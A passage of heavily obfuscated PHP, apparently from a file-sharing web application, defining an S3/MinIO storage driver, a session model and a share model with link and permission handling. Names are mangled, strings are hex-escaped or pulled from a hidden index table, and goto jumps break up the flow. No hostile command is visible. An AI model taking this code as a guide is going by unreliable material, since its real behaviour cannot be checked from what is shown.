$¥Ä¦œó°, array(), $õç•‚ªš); return $ã‘´ºé‘ !== !1 ? $õç•‚ªš : !1; } public function link($–Ş–ÔÕı, $·‚Àï¯Ì = array()) { $˜¦Í¿×‹ =& $_SERVER[ßğøİ]; if ($this->signVer == $˜¦Í¿×‹[216]) { return $this->client->getAuthenticatedURL($this->bucket, $–Ş–ÔÕı, 3600 * 12, $·‚Àï¯Ì); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($–Ş–ÔÕı, $˜¦Í¿×‹[8]), 3600 * 12, $this->region, array(), !0, $·‚Àï¯Ì); } public function fileOut($¤Ş°İŸ, $§ÃÔƒã« = false, $ñÁ¿¯¨‘ = false, $à›ş ˜ = '') { $—ıƒäã =& $_SERVER[ßğøİ]; if ($this->isFileOutServer()) { return $this->fileOutServer($¤Ş°İŸ, $§ÃÔƒã«, $ñÁ¿¯¨‘, $à›ş ˜); } if (!$ñÁ¿¯¨‘) { $ñÁ¿¯¨‘ = $this->pathThis($¤Ş°İŸ); } $ã¯Æ ğÓ = get_file_mime(get_path_ext($ñÁ¿¯¨‘)); if ($ã¯Æ ğÓ == $—ıƒäã[217]) { return parent::fileOut($¤Ş°İŸ, $§ÃÔƒã«, $ñÁ¿¯¨‘, $à›ş ˜); } $õ‚ÙéÅ¼ = array($—ıƒäã[218] => $ã¯Æ ğÓ); if ($§ÃÔƒã«) { $õ‚ÙéÅ¼[$—ıƒäã[219]] = $—ıƒäã[220] . rawurlencode($ñÁ¿¯¨‘); } else { } $ÒéáÆ© = $this->link($¤Ş°İŸ, $õ‚ÙéÅ¼); $this->fileOutLink($ÒéáÆ©); } public function fileOutServer($¶´å¢£ã, $ğÁ›Àƒ = false, $¨ĞÈì“¾ = false, $ÕÖ”Ö¢ = '') { parent::fileOut($¶´å¢£ã, $ğÁ›Àƒ, $¨ĞÈì“¾, $ÕÖ”Ö¢); } public function fileOutImageServer($Â†æ¨’, $à¨é™ = 250) { parent::fileOutImage($Â†æ¨’, $à¨é™); } public function hashMd5($Ï»ë‡²Á, $øÃæâŸÂ = '') { $×ò’Ë’“ =& $_SERVER[ßğøİ]; $‡‹äÏá¯ = $this->objectMeta($Ï»ë‡²Á); if (!$‡‹äÏá¯) { return !1; } $øÃæâŸÂ = $øÃæâŸÂ ? $øÃæâŸÂ : _get($‡‹äÏá¯, $×ò’Ë’“[221]); $øÃæâŸÂ = $øÃæâŸÂ ? $øÃæâŸÂ : _get($‡‹äÏá¯, $×ò’Ë’“[213], $×ò’Ë’“[12]); return $øÃæâŸÂ; } public function uploadFormData($íìœ¢â¥, $Âæ»â“Ç = 3600) { $¥å»ĞÓ =& $_SERVER[ßğøİ]; $ÉŞä’ˆø = $this->pathFather($íìœ¢â¥); $ÒÊ¼¸ô = $this->client->getHttpUploadPostParams($this->bucket, $ÉŞä’ˆø, $¥å»ĞÓ[198], $Âæ»â“Ç); return array_merge((array) $ÒÊ¼¸ô, array($¥å»ĞÓ[181] => $this->getHost())); } public function multiUploadFormData($ÚÇÀï€Ø, $í–âØ¥Ä = 3600) { $Ä×í“Éµ =& $_SERVER[ßğøİ]; $Èòõ°Ñó = gmdate($Ä×í“Éµ[222]); $¦ƒä³·Ù = array(); $ƒ‚êÙÓì = $this->client->getUploadId($this->bucket, $ÚÇÀï€Ø, $¦ƒä³·Ù); if (!$ƒ‚êÙÓì) { return !1; } return array($Ä×í“Éµ[223] => $ƒ‚êÙÓì, $Ä×í“Éµ[181] => $this->getHost() . $Ä×í“Éµ[8] . $this->pathEncode($ÚÇÀï€Ø), $Ä×í“Éµ[224] => $Èòõ°Ñó, $Ä×í“Éµ[94] => $ÚÇÀï€Ø); } public function multiUploadAuthData($¾éÈ²²ş, $Ş½å“µĞ = array()) { $Í’Í†Ï =& $_SERVER[ßğøİ]; $–‰ŞÂ¢ = isset($Ş½å“µĞ[$Í’Í†Ï[224]]) ? $Ş½å“µĞ[$Í’Í†Ï[224]] : gmdate($Í’Í†Ï[222]); $á“ÊĞò = isset($Ş½å“µĞ[$Í’Í†Ï[174]]) ? $Ş½å“µĞ[$Í’Í†Ï[174]] : $Í’Í†Ï[12]; $‹©Í¸äÔ = $Ş½å“µĞ[$Í’Í†Ï[94]]; unset($Ş½å“µĞ[$Í’Í†Ï[94]]); if (isset($Ş½å“µĞ[$Í’Í†Ï[225]])) { $Ş½å“µĞ[$Í’Í†Ï[224]] = $–‰ŞÂ¢; return $this->listUploadParts($‹©Í¸äÔ, $Ş½å“µĞ); } $§¨Ó¢”× = array($Í’Í†Ï[226], $Í’Í†Ï[12], $Í’Í†Ï[120], $Í’Í†Ï[12], "\x78\55\x61\x6d\x7a\x2d\x64\141\164\x65\72{$–‰ŞÂ¢}", $Í’Í†Ï[8] . $this->bucket . $Í’Í†Ï[8] . $this->pathEncode($‹©Í¸äÔ) . $á“ÊĞò); if (strpos($á“ÊĞò, $Í’Í†Ï[227]) === 0) { $§¨Ó¢”×[0] = $Í’Í†Ï[228]; } if (isset($Ş½å“µĞ[$Í’Í†Ï[229]]) && $Ş½å“µĞ[$Í’Í†Ï[229]] == $Í’Í†Ï[230]) { $§¨Ó¢”×[0] = $Í’Í†Ï[230]; } $ÒŒôÍöÂ = implode($Í’Í†Ï[231], $§¨Ó¢”×); $ÀöÔ’Îª = base64_encode(hash_hmac($Í’Í†Ï[232], $ÒŒôÍöÂ, $this->secret, !0)); $çúöëß = $Í’Í†Ï[233] . $this->accessKey . $Í’Í†Ï[4] . $ÀöÔ’Îª; if (strpos($á“ÊĞò, $Í’Í†Ï[227]) === 0) { return array($Í’Í†Ï[234] => $çúöëß, $Í’Í†Ï[224] => $–‰ŞÂ¢); } return $çúöëß; } public function listUploadParts($œäµ‚¶‚, $–·å¦¾ = array()) { $ô™¥»´Š =& $_SERVER[ßğøİ]; $²­…¨Í  = str_replace($ô™¥»´Š[235], $ô™¥»´Š[12], $–·å¦¾[$ô™¥»´Š[174]]); $ßÚ›ø­é = $this->client->listParts($this->bucket, $œäµ‚¶‚, $²­…¨Í ); if (!$ßÚ›ø­é) { return !1; } unset($–·å¦¾[$ô™¥»´Š[225]], $–·å¦¾[$ô™¥»´Š[229]]); $–·å¦¾[$ô™¥»´Š[94]] = $œäµ‚¶‚; $¨üŞò±÷ = $this->multiUploadAuthData($œäµ‚¶‚, $–·å¦¾); if (empty($¨üŞò±÷)) { return !1; } return array($ô™¥»´Š[234] => $¨üŞò±÷, $ô™¥»´Š[224] => $–·å¦¾[$ô™¥»´Š[224]], $ô™¥»´Š[236] => $ßÚ›ø­é); } public function getHost() { return parent::getHost() . $_SERVER[ßğøİ][8] . $this->bucket; } public function size($€ä¾Á‡İ) { $ŞÇ×îŞÒ = $this->objectMeta($€ä¾Á‡İ); return $ŞÇ×îŞÒ ? $ŞÇ×îŞÒ[$_SERVER[ßğøİ][76]] : 0; } public function info($ùÔ¹ÈŸÍ) { if ($this->isFolder($ùÔ¹ÈŸÍ)) { return $this->folderInfo($ùÔ¹ÈŸÍ); } else { if ($this->isFile($ùÔ¹ÈŸÍ)) { return $this->fileInfo($ùÔ¹ÈŸÍ); } } return !1; } public function exist($‰ÂÈùÑã) { return $this->isFile($‰ÂÈùÑã) || $this->isFolder($‰ÂÈùÑã); } public function isFile($¢£ÕÍ‡²) { return !$this->isFolder($¢£ÕÍ‡²) && $this->objectMeta($¢£ÕÍ‡²); } public function isFolder($ÕÌ«à›©) { return $this->cacheMethod($_SERVER[ßğøİ][165], $ÕÌ«à›©); } protected function objectMeta($’å°ö‘) { return $this->cacheMethod($_SERVER[ßğøİ][167], $’å°ö‘); } protected function _objectMeta($ÎÑêŸ‰) { $ÍºØ…™‰ =& $_SERVER[ßğøİ]; $ÎÑêŸ‰ = rtrim($ÎÑêŸ‰, $ÍºØ…™‰[8]); try { $ùÀÀ£—ò = $this->client->getObjectInfo($this->bucket, $ÎÑêŸ‰); if (!isset($ùÀÀ£—ò[$ÍºØ…™‰[221]]) && isset($ùÀÀ£—ò[$ÍºØ…™‰[237]])) { $ùÀÀ£—ò[$ÍºØ…™‰[221]] = $ùÀÀ£—ò[$ÍºØ…™‰[237]]; } } catch (Exception $ßğéÒ‘Í) { $ùÀÀ£—ò = !1; } if (!$ùÀÀ£—ò) { } return $ùÀÀ£—ò; } protected function _isFolder($øæÄ½û½) { $İ‰®«Ãì =& $_SERVER[ßğøİ]; $øæÄ½û½ = rtrim($øæÄ½û½, $İ‰®«Ãì[8]); if ($øæÄ½û½ == $İ‰®«Ãì[12] || $øæÄ½û½ == $İ‰®«Ãì[8]) { return !0; } $ØãâÛ = $this->client->getBucket($this->bucket, $øæÄ½û½, null, 1); if (empty($ØãâÛ[$İ‰®«Ãì[204]])) { return !1; } $¼ °ñ¹é = $ØãâÛ[$İ‰®«Ãì[204]][0][$İ‰®«Ãì[32]]; return stripos($¼ °ñ¹é, $øæÄ½û½ . $İ‰®«Ãì[8]) === 0 ? !0 : !1; if (substr($¼ °ñ¹é, -1) == $İ‰®«Ãì[8]) { return !0; } if (get_path_this($¼ °ñ¹é) == get_path_this($øæÄ½û½)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($…¦÷íàÕ) { parent::__construct($…¦÷íàÕ); $this->signatureVersion($_SERVER[ßğøİ][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto A¦©›¤ã¸³; bø¢¬ªì•Î: class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\x5f\163\x65\x73\163\151\x6f\156"; public function get($ø¤ĞºÒ) { $´»ı§‚É =& $_SERVER[ßğøİ]; $“ûÕ–Œı = $this->where(array($´»ı§‚É[1963] => $ø¤ĞºÒ))->find(); if (!is_array($“ûÕ–Œı)) { return !1; } return $“ûÕ–Œı[$´»ı§‚É[752]]; } public function set($¹½¡Ö‹é, $ç”½ıˆº, $îıÕ÷Œü = 3600) { $«˜ÊÇã½ =& $_SERVER[ßğøİ]; $õ”‚÷²Œ = array($«˜ÊÇã½[1963] => $¹½¡Ö‹é, $«˜ÊÇã½[1867] => $ç”½ıˆº, $«˜ÊÇã½[1964] => $îıÕ÷Œü + time()); if (Session::get($«˜ÊÇã½[1965])) { $õ”‚÷²Œ[$«˜ÊÇã½[1655]] = Session::get($«˜ÊÇã½[1965]); } else { $õ”‚÷²Œ[$«˜ÊÇã½[1655]] = 0; } if ($this->get($¹½¡Ö‹é)) { return $this->where(array($«˜ÊÇã½[1963] => $¹½¡Ö‹é))->save($õ”‚÷²Œ); } else { return $this->add($õ”‚÷²Œ, array(), !0); } } public function remove($ğù©µ ) { return $this->where(array($_SERVER[ßğøİ][1963] => $ğù©µ ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ßğøİ][1966] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\145"; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\x54\x69\155\145", "\x74\151\x6d\x65", "\151\156\x73\145\x72\x74\x2c\x75\160\144\141\164\x65", "\146\165\x6e\143\x74\151\x6f\x6e"), array("\143\162\x65\141\164\x65\x54\151\155\145", "\164\151\155\145", "\x69\156\x73\x65\x72\164", "\146\x75\156\143\164\x69\157\x6e"), array("\x6f\160\164\151\157\156\x73", '', "\151\156\x73\x65\162\164\54\x75\160\x64\141\x74\145\x2c\163\145\x6c\x65\143\x74", "\152\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($áíŞ‡êÔ) { $É¡õÜ…ğ =& $_SERVER[ßğøİ]; $ÔÂªü¦ô = isset($áíŞ‡êÔ[0]) ? $áíŞ‡êÔ[0] : !1; return array($É¡õÜ…ğ[1967] => array(USER_ID, $É¡õÜ…ğ[1968]), $É¡õÜ…ğ[1908] => array($ÔÂªü¦ô, $É¡õÜ…ğ[1969])); } protected function listSimple() { $ô‚ç²©Î = array($_SERVER[ßğøİ][1655] => USER_ID); $ˆÚ°áÂÖ = $this->field($this->fieldList)->where($ô‚ç²©Î)->select(); return $ˆÚ°áÂÖ ? $ˆÚ°áÂÖ : array(); } protected function getInfo($ÆÄ±ú, $àí¢¦‘Ã = false) { $ÙÉÏìŸ± =& $_SERVER[ßğøİ]; if ($àí¢¦‘Ã) { return $this->_getShareInfo(array($ÙÉÏìŸ±[489] => $ÆÄ±ú)); } $¨‰¤ıú± = $this->cacheFunctionGet($ÙÉÏìŸ±[1910], $ÆÄ±ú); return $¨‰¤ıú±; } public function getInfoByHash($©ø†³çÊ) { return $this->_getShareInfo(array($_SERVER[ßğøİ][491] => $©ø†³çÊ)); } public function getInfoByPath($õˆñ³) { $ÏËŸüë‡ =& $_SERVER[ßğøİ]; $“æ…ÖÜñ = array($ÏËŸüë‡[1655] => USER_ID, $ÏËŸüë‡[402] => $õˆñ³); return $this->_getShareInfo($“æ…ÖÜñ); } public function getInfoBySourcePath($µ¢·àöæ) { $õÕå‹ùÓ =& $_SERVER[ßğøİ]; $¸‚öÜè = array($õÕå‹ùÓ[1655] => USER_ID, $õÕå‹ùÓ[1176] => $µ¢·àöæ); return $this->_getShareInfo($¸‚öÜè); } private function _getShareInfo($¯¿æÎ´à) { $Ãêî×Å =& $_SERVER[ßğøİ]; $¨Ûœø„º = $this->where($¯¿æÎ´à)->find(); if (!$¨Ûœø„º) { return !1; } $¯¿æÎ´à = array($Ãêî×Å[489] => $¨Ûœø„º[$Ãêî×Å[489]]); $‘»š²µê = $Ãêî×Å[1970]; $‚¹¯–¸ = Model($Ãêî×Å[602])->order($Ãêî×Å[399])->field($‘»š²µê)->where($¯¿æÎ´à)->select(); if ($¨Ûœø„º[$Ãêî×Å[402]] == $Ãêî×Å[197]) { $¨Ûœø„º[$Ãêî×Å[86]] = IO::info($¨Ûœø„º[$Ãêî×Å[1176]]); } else { $¨Ûœø„º[$Ãêî×Å[86]] = Model($Ãêî×Å[1327])->pathInfo($¨Ûœø„º[$Ãêî×Å[402]]); } $¨Ûœø„º[$Ãêî×Å[1971]] = $‚¹¯–¸; return $¨Ûœø„º; } protected function getInfoAuth($œŒÃŸ ) { $õıŒ²ã =& $_SERVER[ßğøİ]; $è†Â”ÏÜ = $this->getInfo($œŒÃŸ ); if ($è†Â”ÏÜ[$õıŒ²ã[1655]] == USER_ID) { $è†Â”ÏÜ[$õıŒ²ã[413]] = $è†Â”ÏÜ[$õıŒ²ã[86]][$õıŒ²ã[413]]; } else { $è†Â”ÏÜ[$õıŒ²ã[413]] = Model($õıŒ²ã[502])->authMake($è†Â”ÏÜ[$õıŒ²ã[1971]]); } return $è†Â”ÏÜ; } protected function listData($ë¬ÆŞè² = null, $ÄƒÌ£ô = 300) { $ÃËÒº‘ =& $_SERVER[ßğøİ]; $æúª±ûº = array(array($ÃËÒº‘[494] => array($ÃËÒº‘[1012], 0), $ÃËÒº‘[496] => array($ÃËÒº‘[1012], 0), $ÃËÒº‘[1972] => $ÃËÒº‘[1926])); if ($ë¬ÆŞè² == $ÃËÒº‘[1973]) { $æúª±ûº = array($ÃËÒº‘[494] => 1); } else { if ($ë¬ÆŞè² == $ÃËÒº‘[1161]) { $æúª±ûº = array($ÃËÒº‘[496] => 1); } } $æúª±ûº[$ÃËÒº‘[1655]] = USER_ID; $å¯›ÆÁƒ = $this->where($æúª±ûº)->selectPage($ÄƒÌ£ô); return $å¯›ÆÁƒ; } protected function listToMe($¾•”šü‡ = 300) { $ì›™¦²Ë =& $_SERVER[ßğøİ]; $ø›ˆŸÛ† = Model($ì›™¦²Ë[1974])->userGroupParents(USER_ID); $œ½·¼” = array($ì›™¦²Ë[586] => SourceModel::TYPE_USER, $ì›™¦²Ë[505] => USER_ID); if ($ø›ˆŸÛ†) { $œ½·¼” = array(array($ì›™¦²Ë[586] => SourceModel::TYPE_USER, $ì›™¦²Ë[505] => USER_ID), array($ì›™¦²Ë[586] => SourceModel::TYPE_GROUP, $ì›™¦²Ë[505] => array($ì›™¦²Ë[7], $ø›ˆŸÛ†)), $ì›™¦²Ë[1972] => $ì›™¦²Ë[1926]); } $¥ø©•ÆÏ = Model($ì›™¦²Ë[602])->where($œ½·¼”)->selectPage($¾•”šü‡); $¼ûƒŞê = array_to_keyvalue_group($¥ø©•ÆÏ[$ì›™¦²Ë[369]], $ì›™¦²Ë[489]); if (!$¼ûƒŞê) { return $¥ø©•ÆÏ; } $¯œ¹õ‘¦ = $ì›™¦²Ë[1975]; $œ½·¼” = array($ì›™¦²Ë[489] => array($ì›™¦²Ë[418], array_keys($¼ûƒŞê)), $ì›™¦²Ë[1655] => array($ì›™¦²Ë[1014], $ì›™¦²Ë[197])); $Î–—ïğ¼ = $this->field($¯œ¹õ‘¦)->where($œ½·¼”)->select(); foreach ($Î–—ïğ¼ as $õØÀ‰÷ù => &$éøšå‘Å) { $éøšå‘Å[$ì›™¦²Ë[1971]] = $¼ûƒŞê[$éøšå‘Å[$ì›™¦²Ë[489]]]; } unset($éøšå‘Å); $‰œ ïş” = array($ì›™¦²Ë[1976] => $Î–—ïğ¼, $ì›™¦²Ë[1977] => $¥ø©•ÆÏ[$ì›™¦²Ë[366]]); return $‰œ ïş”; } protected function shareAdd($˜É­¯¥ß, $Î„¡¡‚Ç) { $ı›ç‰Şñ =& $_SERVER[ßğøİ]; $óŸºÔŸÏ = $this->_addShareData($˜É­¯¥ß, $Î„¡¡‚Ç); if (!empty($Î„¡¡‚Ç[$ı›ç‰Şñ[1978]])) { $this->_shareAuthSet($óŸºÔŸÏ, $Î„¡¡‚Ç[$ı›ç‰Şñ[1978]]); } $this->shareEventAdd($˜É­¯¥ß, $Î„¡¡‚Ç, $ı›ç‰Şñ[1164]); return $óŸºÔŸÏ; } protected function shareAddSystem($‘çûÇºÎ, $‚¾Ìãüß) { $°‰äÎÇ„ =& $_SERVER[ßğøİ]; $ş”«ÏÕ¹ = $this->_addShareData($‘çûÇºÎ, $‚¾Ìãüß, $°‰äÎÇ„[1276]); $this->_shareAuthSet($ş”«ÏÕ¹, $‚¾Ìãüß[$°‰äÎÇ„[1978]]); return $ş”«ÏÕ¹; } private function shareEventAdd($¼±ÉÙÒŒ, $›Á­ö€, $—Š‰™ç = "\141\144\144") { $îúÚ­ºŸ =& $_SERVER[ßğøİ]; if (!$¼±ÉÙÒŒ || $¼±ÉÙÒŒ == $îúÚ­ºŸ[197]) { return; } if ($—Š‰™ç == $îúÚ­ºŸ[1164]) { if ($›Á­ö€[$îúÚ­ºŸ[494]] == $îúÚ­ºŸ[88]) { Model($îúÚ­ºŸ[570])->eventShare($¼±ÉÙÒŒ, $îúÚ­ºŸ[1979]); } if ($›Á­ö€[$îúÚ­ºŸ[496]] == $îúÚ­ºŸ[88]) { Model($îúÚ­ºŸ[570])->eventShare($¼±ÉÙÒŒ, $îúÚ­ºŸ[1980]); } return; } $ÁÔòª²‚ = $this->getInfoByPath($¼±ÉÙÒŒ); $‘ıÇŞÃ = $îúÚ­ºŸ[1981]; if ($ÁÔòª²‚[$îúÚ­ºŸ[494]] == $îúÚ­ºŸ[197] && $›Á­ö€[$îúÚ­ºŸ[494]] == $îúÚ­ºŸ[88]) { $‘ıÇŞÃ = $îúÚ­ºŸ[1979]; } if ($ÁÔòª²‚[$îúÚ­ºŸ[494]] == $îúÚ­ºŸ[88] && $›Á­ö€[$îúÚ­ºŸ[494]] == $îúÚ­ºŸ[197]) { $‘ıÇŞÃ = $îúÚ­ºŸ[1982]; } if ($ÁÔòª²‚[$îúÚ­ºŸ[496]] == $îúÚ­ºŸ[197] && $›Á­ö€[$îúÚ­ºŸ[496]] == $îúÚ­ºŸ[88]) { $‘ıÇŞÃ = $îúÚ­ºŸ[1980]; } if ($ÁÔòª²‚[$îúÚ­ºŸ[496]] == $îúÚ­ºŸ[88] && $›Á­ö€[$îúÚ­ºŸ[496]] == $îúÚ­ºŸ[197]) { $‘ıÇŞÃ = $îúÚ­ºŸ[1983]; } Model($îúÚ­ºŸ[570])->eventShare($¼±ÉÙÒŒ, $‘ıÇŞÃ); return; } private function _addShareData($®ƒöà¹Ù, $¾£ù¦á× = array(), $©âò›Û = false) { $“Î—”Û¹ =& $_SERVER[ßğøİ]; $“ÑŸø²Ñ = $©âò›Û == $“Î—”Û¹[1276] ? 0 : USER_ID; $›¡”¿¨« = array($“Î—”Û¹[417] => $®ƒöà¹Ù, $“Î—”Û¹[1646] => $“ÑŸø²Ñ); if ($®ƒöà¹Ù == 0) { $›¡”¿¨« = array($“Î—”Û¹[1984] => $¾£ù¦á×[$“Î—”Û¹[1176]], $“Î—”Û¹[1646] => $“ÑŸø²Ñ); } if ($¡åâ×© = $this->where($›¡”¿¨«)->find()) { return $¡åâ×©[$“Î—”Û¹[489]]; } if ($®ƒöà¹Ù == 0) { $Ø¢œëµà = array($“Î—”Û¹[32] => get_path_this($¾£ù¦á×[$“Î—”Û¹[84]])); } else { $Ø¢œëµà = Model($“Î—”Û¹[822])->sourceInfo($®ƒöà¹Ù); if (!$Ø¢œëµà) { return !1; } } if (!$¾£ù¦á×[$“Î—”Û¹[1554]]) { $¾£ù¦á×[$“Î—”Û¹[1554]] = $Ø¢œëµà[$“Î—”Û¹[32]]; } $ÁÀ†›¿Ç = array($“Î—”Û¹[1646] => $“ÑŸø²Ñ, $“Î—”Û¹[417] => $®ƒöà¹Ù, $“Î—”Û¹[1554] => $“Î—”Û¹[12], $“Î—”Û¹[494] => 0, $“Î—”Û¹[496] => 0, $“Î—”Û¹[1176] => $“Î—”Û¹[12], $“Î—”Û¹[307] => $“Î—”Û¹[12], $“Î—”Û¹[888] => $“Î—”Û¹[12], $“Î—”Û¹[1985] => 0, $“Î—”Û¹[1986] => 0, $“Î—”Û¹[497] => 0, $“Î—”Û¹[498] => $“Î—”Û¹[12], $“Î—”Û¹[491] => $“Î—”Û¹[12]); $’àô ‹ = explode($“Î—”Û¹[50], $“Î—”Û¹[1987]); foreach ($’àô ‹ as $¬ÈÕÓÅâ) { if (!isset($¾£ù¦á×[$¬ÈÕÓÅâ])) { continue; } $ÁÀ†›¿Ç[$¬ÈÕÓÅâ] = $¾£ù¦á×[$¬ÈÕÓÅâ]; } $‡‘û«¡“ = $this->add($ÁÀ†›¿Ç); $œÔúíÖ¶ = array($“Î—”Û¹[491] => short_id($‡‘û«¡“)); $this->where(array($“Î—”Û¹[488] => $‡‘û«¡“))->save($œÔúíÖ¶); return $‡‘û«¡“; } private function _shareAuthSet($¾Ò²áÛç, $ğß¶ëŸ) { $Óáı’ú =& $_SERVER[ßğøİ]; if (!is_array($ğß¶ëŸ)) { return !1; } $§äÖä‹ = Model($Óáı’ú[1936]); $§äÖä‹->where(array($Óáı’ú[489] => $¾Ò²áÛç))->delete(); $Ç²·ßæ­ = array(); foreach ($ğß¶ëŸ as $–“ü±Î) { $Â¸”¢»ğ = SourceModel::TYPE_USER; if ($–“ü±Î[$Óáı’ú[411]] == SourceModel::TYPE_GROUP) { $Â¸”¢»ğ = SourceModel::TYPE_GROUP; } $·şõ“¦ = array($Óáı’ú[489] => $¾Ò²áÛç, $Óáı’ú[411] => $Â¸”¢»ğ, $Óáı’ú[505] => intval($–“ü±Î[$Óáı’ú[505]]), $Óáı’ú[1932] => 0, $Óáı’ú[1988] => -1); if ($–“ü±Î[$Óáı’ú[1932]]) { $·şõ“¦[$Óáı’ú[1932]] = $–“ü±Î[$Óáı’ú[1932]]; } else { if ($–“ü±Î[$Óáı’ú[1988]]) { $·şõ“¦[$Óáı’ú[1988]] = $–“ü±Î[$Óáı’ú[1988]]; } } $Ç²·ßæ­[] = $·şõ“¦; } return $§äÖä‹->addAll($Ç²·ßæ­, array(), !0); } public function numViewAdd($¡ÒÃ¹«Í) { $ß‡ø”“Õ =& $_SERVER[ßğøİ]; $ Èé¡™ = array($ß‡ø”“Õ[488] => $¡ÒÃ¹«Í); $this->where($ Èé¡™)->setAdd($ß‡ø”“Õ[1985]); } public function numDownloadAdd($¦îêÓ¢æ) { $Ó“åÇéÛ =& $_SERVER[ßğøİ]; $è­ƒüêì = array($Ó“åÇéÛ[488] => $¦îêÓ¢æ); $this->where($è­ƒüêì)->setAdd($Ó“åÇéÛ[1986]); } protected function shareEdit($’ÍŸ„ßÔ, $Ş‰ìÍ¢) { $•ëßÈ¼ı =& $_SERVER[ßğøİ]; $ı—ËÊ²Å = $this->getInfo($’ÍŸ„ßÔ); if (!$ı—ËÊ²Å) { return !1; } $this->_checkLinkShare($Ş‰ìÍ¢, $ı—ËÊ²Å); $äÔ…¡Ì¥ = array(); $Ğ®éâÙİ = explode($•ëßÈ¼ı[50], $•ëßÈ¼ı[1989]); foreach ($Ğ®éâÙİ as $ş»Ïãàú) { if (!array_key_exists($ş»Ïãàú, $Ş‰ìÍ¢)) { continue; } $äÔ…¡Ì¥[$ş»Ïãàú] = $Ş‰ìÍ¢[$ş»Ïãàú]; } $this->shareEventAdd($ı—ËÊ²Å[$•ëßÈ¼ı[402]], $Ş‰ìÍ¢, $•ëßÈ¼ı[1798]); $this->where(array($•ëßÈ¼ı[488] => $’ÍŸ„ßÔ))->save($äÔ…¡Ì¥); if (isset($Ş‰ìÍ¢[$•ëßÈ¼ı[1978]])) { $this->_shareAuthSet($’ÍŸ„ßÔ, $Ş‰ìÍ¢[$•ëßÈ¼ı[1978]]); } return !0; } private function _checkLinkShare($‘ÓĞ®, $ßû¢äÎ) { $ÜõÄÉğû =& $_SERVER[ßğøİ]; if ($‘ÓĞ®[$ÜõÄÉğû[494]] != $ÜõÄÉğû[88]) { return; } $¦Æ†ƒî = $ßû¢äÎ[$ÜõÄÉğû[86]][$ÜõÄÉğû[402]]; if ($ßû¢äÎ[$ÜõÄÉğû[86]][$ÜõÄÉğû[33]] != $ÜõÄÉğû[199]) { $æÃ¹ã© = $this->_folderReport($¦Æ†ƒî); if (!$æÃ¹ã©) { return; } show_json(LNG($ÜõÄÉğû[1990]) . $ÜõÄÉğû[1991] . $æÃ¹ã©, !1); } $í‰Ô·¢Ê = Model($ÜõÄÉğû[822])->fileInfoGet($ßû¢äÎ[$ÜõÄÉğû[86]][$ÜõÄÉğû[402]]); if (!$í‰Ô·¢Ê) { return; } $Áíº‹ = $this->shareFileMeta($í‰Ô·¢Ê[$ÜõÄÉğû[468]]); if (isset($Áíº‹[$ÜõÄÉğû[374]]) && $Áíº‹[$ÜõÄÉğû[374]] == $ÜõÄÉğû[88]) { show_json(LNG($ÜõÄÉğû[1992]), !1); } } private function _folderReport($í²™õ¿¸) { $áÈ†×Ã¾ =& $_SERVER[ßğøİ]; $í‘™úî = array($áÈ†×Ã¾[468] => array($áÈ†×Ã¾[1012], 0), $áÈ†×Ã¾[747] => 3); $‘ô©£Ç÷ = Model($áÈ†×Ã¾[1993])->where($í‘™úî)->field($áÈ†×Ã¾[468])->select(); if (!$‘ô©£Ç÷) { return !1; } $‘ô©£Ç÷ = array_to_keyvalue($‘ô©£Ç÷, $áÈ†×Ã¾[12], $áÈ†×Ã¾[468]); $Ú©éòÉ€ = $áÈ†×Ã¾[50] . $í²™õ¿¸ . $áÈ†×Ã¾[50]; $í‘™úî = array($áÈ†×Ã¾[468] => array($áÈ†×Ã¾[7], $‘ô©£Ç÷), $áÈ†×Ã¾[521] => array($áÈ†×Ã¾[383], "\x25{$Ú©éòÉ€}\45"), $áÈ†×Ã¾[431] => 0); $Şäº†ğ¿ = Model($áÈ†×Ã¾[822])->where($í‘™úî)->field($áÈ†×Ã¾[1994])->find(); if (!$Şäº†ğ¿) { return !1; } $ëÁ÷¼‹ø = substr($Şäº†ğ¿[$áÈ†×Ã¾[521]], strpos($Şäº†ğ¿[$áÈ†×Ã¾[521]], $Ú©éòÉ€)); $í‘™úî = array($áÈ†×Ã¾[402] => array($áÈ†×Ã¾[7], trim($ëÁ÷¼‹ø, $áÈ†×Ã¾[50]))); $¬ÎªƒÊÒ = Model($áÈ†×Ã¾[822])->where($í‘™úî)->field($áÈ†×Ã¾[32])->select(); $•±”õÓÎ = array_to_keyvalue($¬ÎªƒÊÒ, $áÈ†×Ã¾[12], $áÈ†×Ã¾[32]); $•±”õÓÎ[] = $Şäº†ğ¿[$áÈ†×Ã¾[32]]; return implode($áÈ†×Ã¾[8], $•±”õÓÎ); } protected function remove($ËÑã¨) { $áºçûĞ¦ =& $_SERVER[ßğøİ]; if (is_array($ËÑã¨)) { $ËÑã¨ = array($áºçûĞ¦[7], $ËÑã¨); } $­£ÔÆÀÉ = array($áºçûĞ¦[489] => $ËÑã¨); $±Ğ€ÜæÏ = $this->where($­£ÔÆÀÉ)->delete(); if ($±Ğ€ÜæÏ) { Model($áºçûĞ¦[602])->where(array($áºçûĞ¦[489] => $ËÑã¨))->delete(); } $Ñ´çºäÜ = is_array($ËÑã¨) ? $ËÑã¨[1] : array($ËÑã¨); for ($óÍ‡îó‚ = 0; $óÍ‡îó‚ < count($Ñ´çºäÜ); $óÍ‡îó‚++) { $Å¿Ú¼ º = $this->getInfo($Ñ´çºäÜ[$óÍ‡îó‚]); if ($Å¿Ú¼ º[$áºçûĞ¦[496]] == $áºçûĞ¦[88]) { Model($áºçûĞ¦[570])->eventShare($Å¿Ú¼ º[$áºçûĞ¦[402]], $áºçûĞ¦[1983]); } if ($Å¿Ú¼ º[$áºçûĞ¦[494]] == $áºçûĞ¦[88]) { Model($áºçûĞ¦[570])->eventShare($Å¿Ú¼ º[$áºçûĞ¦[402]], $áºçûĞ¦[1982]); } } return $±Ğ€ÜæÏ; } protected function removeBySource($ß¦İ…Ë³) { $æºÄğ‰‹ =& $_SERVER[ßğøİ]; $ûº¦²‡Ã = array($æºÄğ‰‹[417] => array($æºÄğ‰‹[418], $ß¦İ…Ë³)); $šÖ¾ëò = $this->field($æºÄğ‰‹[489])->where($ûº¦²‡Ã)->select(); 